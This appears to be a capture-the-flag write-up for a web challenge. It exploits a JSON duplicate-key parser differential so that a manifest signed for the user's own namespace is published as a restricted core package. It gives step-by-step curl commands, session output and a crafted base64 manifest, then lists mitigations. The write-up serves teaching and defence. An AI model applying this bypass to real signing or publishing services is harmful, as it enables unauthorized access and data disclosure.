@@ -1,0 +1,155 @@
+Challenge: Canonically Yours
+Platform: Intigriti Monthly CTF — July 2026
+Category: Web Security / Broken Access Control
+Vulnerability: JSON Parser Differential (Duplicate-Key Confusion)
+Difficulty: Medium–Hard
+Target: https://challenge-0726.intigriti.io
+written by : 𝕄𝕣 𝕤𝕪𝕤𝕥𝕖𝕞
+=========================================================
+
+
+Introduction
+
+The Canonically Yours challenge from the Intigriti July 2026 CTF demonstrates a JSON Parser Differential vulnerability, also known as Duplicate-Key Confusion.
+The application signs manifests based on one JSON interpretation while the publication service processes another, 
+allowing an attacker to bypass namespace restrictions and access a protected package.
+Root Cause
+
+The vulnerability exists because the application processes the same JSON document differently across two backend services. 
+The signing service validates the first occurrence of the duplicated `package` key, while the publication service uses the last occurrence.
+This parser inconsistency allows an authorized manifest to be interpreted as a request for a restricted package.
+
+
+Step 1: Register a New Account
+eg.
+curl -s -c cookies.txt -X POST https://challenge-0726.intigriti.io/api/register \
+  -H 'content-type: application/json' \
+  -d '{"username":"YOUR_USERNAME","password":"YOUR_PASSWORD"}'
+
+$curl -s -c cookies.txt -X POST https://challenge-0726.intigriti.io/api/register
+-H 'content-type: application/json'   
+-d'{"username":"cybermastera","password":"zxcvbnmsmnbv"}'
+
+
+Step 2: Retrieve Session Details & CSRF Token
+eg
+curl -s -b cookies.txt https://challenge-0726.intigriti.io/api/me
+
+┌─[live@parrot]─[~]
+└──╼ $curl -s -b cookies.txt https://challenge-0726.intigriti.io/api/me
+
+{"user":{"id":"ef59a73d-ae96-433f-9925-6ade4354cae5","username":"cybermastera","namespace":"cybermastera-bd482321"},
+"csrf_token":"3a217911f4d229464d822b86c27b61dd52570be1beadf9548d50f3ecffcfeec2"}
+┌─[live@parrot]─[~]
+└──╼ $
+
+Step 3: Craft the Dual-Package Manifest
+eg 
+echo -n '{"package":{"scope":"<your-namespace>","name":"hello-world","version":"1.0.0"},
+"package":{"scope":"core","name":"security-notes","version":"1.0.0"},
+"metadata":{"description":"x","visibility":"private"},"operation":"preflight"}' | base64 -w 0
+
+┌─[live@parrot]─[~]
+└──╼$echo -n '{"package":{"scope":"cybermastera-bd482321","name":"hello-world",\             
+"version":"1.0.0"},"package":{"scope":"core","name":"security-notes","version":"1.0.0"},
+"metadata":{"description":"x","visibility":"private"},"operation":"preflight"}' | base64 -w 0
+
+eyJwYWNrYWdlIjp7InNjb3BlIjoiY3liZXJtYXN0ZXJhLWJkNDgyMzIxIiwibmFtZSI6ImhlbGxvLXdvcmxkIixcICAgICAgICAgICAgICJ2ZXJzaW9uIjoi
+MS4wLjAifSwicGFja2FnZSI6eyJzY29wZSI6ImNvcmUiLCJuYW1lIjoic2VjdXJpdHktbm90ZXMiLCJ2ZXJzaW9uIjoiMS4wLjAifSwibWV0YWRhdGEiOnsiZ
+GVzY3JpcHRpb24iOiJ4IiwidmlzaWJpbGl0eSI6InByaXZhdGUifSwib3BlcmF0aW9uIjoicHJlZmxpZ2h0In0=
+┌─[live@parrot]─[~]
+└──╼ $
+
+Why It Works
+
+Manifest
+      │
+      ▼
+Signing Service
+(First package)
+      │
+      ▼
+Manifest Signed
+      │
+      ▼
+Publication Service
+(Last package)
+      │
+      ▼
+@core/security-notes
+      │
+      ▼
+FLAG
+
+{
+  "package": {
+    "scope": "your-namespace"
+  },
+  "package": {
+    "scope": "core"
+  }
+}
+
+Step 4: Sign the Manifest
+eg 
+curl -s -b cookies.txt -X POST https://challenge-0726.intigriti.io/api/manifests/sign \
+  -H 'content-type: application/json' \
+  -H 'x-csrf-token: <YOUR_CSRF_TOKEN>' \
+  -d '{"manifest_b64":"<YOUR_NEW_BASE64_MANIFEST>"}'
+
+
+┌─[live@parrot]─[~]
+└──╼ $curl -s -b cookies.txt -X POST https://challenge-0726.intigriti.io/api/manifests/sign  
+-H 'content-type: application/json'-H 'x-csrf-token: 3a217911f4d229464d822b86c27b61dd52570be1beadf9548d50f3ecffcfeec2'   
+-d '{"manifest_b64":"eyJwYWNrYWdlIjp7InNjb3BlIjoiY3liZXJtYXN0ZXJhLWJkNDgyMzIxIiwibmFtZSI6ImhlbGxvLXdvcmxkIiwidmVyc2lvbiI6IjEuMC4wIn0sInBhY2thZ2UiOnsic2NvcGUiOiJjb3JlIiwibmFtZSI6I
+nNlY3VyaXR5LW5vdGVzIiwidmVyc2lvbiI6IjEuMC4wIn0sIm1ldGFkYXRhIjp7ImRlc2NyaXB0aW9uIjoieCIsInZpc2liaWxpdHkiOiJwcml2YXRlIn0sIm9wZXJhdGlvbiI6InByZWZsaWdodCJ9"}'
+
+{"approval_id":"f0829240-1448-4993-93ba-c8c5b99fb9fe","manifest_sha256":"0f6fd212a6fdf242e79a42522bf95e4cb202533b60525077aed85e88118938b4","nonce":"GDUbsTzuZpR4yE6MoZv4Vzl-PZIm-uIqqDN1WBsWAl8","expires_at":1786155157,"signature":"P9+WOF9GMKu9xbgZUg71yyFyL7fPM44VsYWiCTlpoznD5aVuDi4kSkxDgLRvS6iNjMH29pClvWQgPoywxensDA=="}
+┌─[live@parrot]─[~]
+└──╼ $
+
+Step 5: Publish the Approved Manifest
+eg 
+curl -s -b cookies.txt -X POST https://challenge-0726.intigriti.io/api/publications \
+  -H 'content-type: application/json' \
+  -H 'x-csrf-token: <YOUR_CSRF_TOKEN>' \
+  -d '{
+    "manifest_b64":"<YOUR_BASE64_ENCODED_MANIFEST>",
+    "approval_id":"<APPROVAL_ID>",
+    "manifest_sha256":"<MANIFEST_SHA256>",
+    "nonce":"<NONCE>",
+    "expires_at":<EXPIRES_AT>,
+    "signature":"<SIGNATURE>"
+  }'
+
+
+Step 6: Fetch the Report and Retrieve the Flag
+eg
+curl -s -b cookies.txt https://challenge-0726.intigriti.io/api/publications/<PUBLICATION_ID>
+
+Security Impact
+
+Parser differential vulnerabilities can lead to:
+
+    Authorization Bypass
+    Broken Access Control
+    Sensitive Data Disclosure
+    Business Logic Abuse
+
+Mitigation
+
+    Reject duplicate JSON keys.
+    Use a canonical JSON parser.
+    Validate permissions after parsing.
+    Share the same parsed object across all backend services.
+
+Conclusion
+
+This challenge demonstrates how parser inconsistencies can create authorization bypasses even when cryptographic signing is implemented correctly. 
+A single duplicated JSON key was enough to bypass namespace restrictions and access protected resources.
+Disclaimer
+
+This write-up is published for educational purposes and documents a challenge officially released as part of the Intigriti July 2026 CTF.
+
+
+
